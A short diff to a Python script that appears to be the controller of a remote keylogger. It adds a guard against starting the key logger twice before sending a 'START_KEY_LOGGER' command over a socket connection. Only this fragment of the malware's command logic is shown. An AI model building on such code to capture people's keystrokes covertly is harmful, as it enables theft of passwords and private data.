@@ -133,6 +133,9 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
+        if is_running_key_logger:
+            print("Key logger already running...")
+            # TODO: break
         SocketManager.send_data(conn, "START_KEY_LOGGER")
         is_running_key_logger = True
         time.sleep(20)
